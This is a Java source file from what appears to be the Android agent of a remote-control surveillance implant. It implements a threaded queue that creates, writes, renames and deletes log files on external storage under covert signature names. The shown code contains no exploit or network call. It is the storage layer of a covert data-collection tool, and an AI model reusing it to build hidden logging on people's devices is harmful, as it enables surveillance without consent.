package com.ht.RCSAndroidGUI;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Utils;

import android.os.Environment;
import android.util.Log;

public class LogDispatcher extends Thread implements Runnable {
	private volatile static LogDispatcher singleton;
	private BlockingQueue<Packet> q;
	private HashMap<Long, File> logMap;
	
	private boolean halt;
	private File sdDir;
	
	final Lock lock = new ReentrantLock();
	final Condition noLogs = lock.newCondition(); 
	
	/*private BroadcastReceiver mExternalStorageReceiver;
	private boolean mExternalStorageAvailable = false;
	private boolean mExternalStorageWriteable = false;*/

	private LogDispatcher() {
		halt = false;
		
		q = new LinkedBlockingQueue<Packet>();
		logMap = new HashMap<Long, File>();
	}
	
	// Log name: QZM + 1 byte + 8 bytes + 4 bytes
	// QZA     -> Signature
	// 1 byte  -> Priority: 1 max - 255 min
	// 8 bytes -> Timestamp
	// 4 bytes -> .tmp while writing, .log when ready
	//
	// Markup name: QZM + 4 byte + 4 byte
	// QZM     -> Signature
	// 4 bytes -> Log Type
	// 4 bytes -> .mrk
	private void processQueue() {
		Packet p;
		//Log.d("RCS", "processQueue() Packets in Queue: " + q.size());
		
		if (q.size() == 0)
			return;
		
		try {
			p = q.take();
		} catch (InterruptedException e) {
			e.printStackTrace();
			return;
		}

		switch (p.getCommand()) {
			case LogR.LOG_CREATE:
				Log.d("RCS", "processQueue() got LOG_CREATE");
				createLog(p);
				break;
				
			case LogR.LOG_ADDITIONAL:
				Log.d("RCS", "processQueue() got LOG_ADDITIONAL");
				break;
				
			case LogR.LOG_APPEND:
				Log.d("RCS", "processQueue() got LOG_APPEND");
				break;
				
			case LogR.LOG_WRITE:
				Log.d("RCS", "processQueue() got LOG_WRITE");
				writeLog(p);
				break;
				
			case LogR.LOG_CLOSE:
				Log.d("RCS", "processQueue() got LOG_CLOSE");
				closeLog(p);
				break;
				
			case LogR.LOG_REMOVE:
				Log.d("RCS", "processQueue() got LOG_REMOVE");
				removeLog(p);
				break;
			
			case LogR.LOG_REMOVEALL:
				Log.d("RCS", "processQueue() got LOG_REMOVEALL");
				removeAll();
				break;

			case LogR.LOG_WRITEMRK:
				Log.d("RCS", "processQueue() got LOG_WRITEMRK");
				writeMarkup(p);
				break;

			default:
				Log.d("RCS", "processQueue() got LOG_UNKNOWN");
				break;
		}
		
		return;
	}
	
	public static LogDispatcher self() {
		if (singleton == null) {
			synchronized(LogDispatcher.class) {
				if (singleton == null) {
                    singleton = new LogDispatcher();
                }
			}
		}

		return singleton;
	}
	
	public void run() {
		Log.d("RCS", "LogDispatcher started");
		
		// Create log directory
		sdDir = new File(Path.logs());
		sdDir.mkdirs();
		
		// Debug - used to remove the directory
		// sdDir();
		
		while (true) {
			lock.lock();
			
			try {
				while (q.size() == 0 && !halt)
					noLogs.await();

				// Halt command has precedence over queue processing
				if (halt == true) {
					q.clear();
					logMap.clear();
					Log.d("RCS", "LogDispatcher closing");
					return;
				}
				
				processQueue();
			} catch (InterruptedException e) {
				e.printStackTrace();
			} finally {
				lock.unlock();
			}
		}
	}
	
	public synchronized boolean send(Packet o) {
		lock.lock();
		boolean added = false;
		
		try {
			added = q.add(o);
			
			if (added) 
				noLogs.signal();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			lock.unlock();
		}
		
		return added;
	}
	
	public synchronized void halt() {
		lock.lock();
		
		try {
			halt = true;
			noLogs.signal();
		} finally {
			lock.unlock();
		}
	}
	
	private boolean createLog(Packet p) {
		try {
			// Create the file
			File file;
			
			do {
				file = null;
				String logName = "QZA-" + (byte)p.getPriority() + "-" + Utils.getTimeStamp() + ".tmp";
				file = new File(sdDir, logName);
			} while (file.createNewFile() == false);
			
			if (logMap.containsKey(p.getId()) == true) {
				Log.d("RCS", "Duplicate log entry");
				return false;
			}
			
			logMap.put(p.getId(), file);
		} catch (Exception e) {
			Log.d("RCS", "LogDispatcher.createLog() exception detected");
			e.printStackTrace();
			return false;
		}
		
		return true;
	}

	private boolean writeMarkup(Packet p) {
		try {
			File file = null;
			String markupName = "QZM-" + p.getType() + ".mrk";
			
			file = new File(sdDir, markupName);
			
			boolean created = file.createNewFile();
			
			if (created == false)
				return false;
			
			// TODO: Scrivi nel file
			
			return true;
		} catch (Exception e) {
			Log.d("RCS", "LogDispatcher.createLog() exception detected");
			e.printStackTrace();
			return false;
		}
	}
	
	private boolean writeLog(Packet p) {
		OutputStream out = null;
		
		try {
			// Create the file
			File file;
			
			do {
				file = null;
				String logName = "QZA-" + (byte)p.getPriority() + "-" + Utils.getTimeStamp() + ".tmp";
				file = new File(sdDir, logName);
			} while (file.createNewFile() == false);
			
			if (logMap.containsKey(p.getId()) == true) {
				Log.d("RCS", "Duplicate log entry");
				return false;
			}
			
			logMap.put(p.getId(), file);
			
			out = new BufferedOutputStream(new FileOutputStream(file));
			out.write('Q');
			out.flush();
			out.close();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
		   	if (out != null) {
				try {
					out.close();
				} catch (IOException e) {
					e.printStackTrace();
					return false;
				}
		   	}
		}
		
		return true;
	}
	
	private boolean closeLog(Packet p) {
		if (logMap.containsKey(p.getId()) == false) {
			Log.d("RCS", "Requested log not found");
			return false;
		}
		
		// Rename .tmp to .log
		File file = logMap.get(p.getId());
		
		String name = file.getName();
		
		name = name.replaceFirst(".tmp", ".log");
		
		File to = new File(file.getParent(), name);
		boolean rename = file.renameTo(to);
		
		logMap.remove(p.getId());
		return rename;
	}
	
	private boolean removeLog(Packet p) {
		if (logMap.containsKey(p.getId()) == false) {
			Log.d("RCS", "LogDispatcher.removeLog() Requested log not found");
			return false;
		}
		
		// Rename .tmp to .log
		File file = logMap.get(p.getId());
		
		boolean remove = file.delete();
		
		logMap.remove(p.getId());
		return remove;
	}
	
	private void removeAll() {
		File sdRemove = new File(Environment.getExternalStorageDirectory(), "rcs");
		File file[] = sdRemove.listFiles(new ExtensionFilter(".log"));
		
		for (File f : file) {
			Log.d("RCS", "Log list: " + f.getName());
			f.delete();
		}
	}

	
	/* Inserire un Intent-receiver per gestire la rimozione della SD
	private void updateExternalStorageState() {
	    String state = Environment.getExternalStorageState();
	    if (Environment.MEDIA_MOUNTED.equals(state)) {
	        mExternalStorageAvailable = mExternalStorageWriteable = true;
	    } else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
	        mExternalStorageAvailable = true;
	        mExternalStorageWriteable = false;
	    } else {
	        mExternalStorageAvailable = mExternalStorageWriteable = false;
	    }
	    handleExternalStorageState(mExternalStorageAvailable,
	            mExternalStorageWriteable);
	}

	private void startWatchingExternalStorage() {
	    mExternalStorageReceiver = new BroadcastReceiver() {
	        @Override
	        public void onReceive(Context context, Intent intent) {
	            Log.i("test", "Storage: " + intent.getData());
	            updateExternalStorageState();
	        }
	    };
	    IntentFilter filter = new IntentFilter();
	    filter.addAction(Intent.ACTION_MEDIA_MOUNTED);
	    filter.addAction(Intent.ACTION_MEDIA_REMOVED);
	    registerReceiver(mExternalStorageReceiver, filter);
	    updateExternalStorageState();
	}

	private void stopWatchingExternalStorage() {
	    unregisterReceiver(mExternalStorageReceiver);
	}*/
}
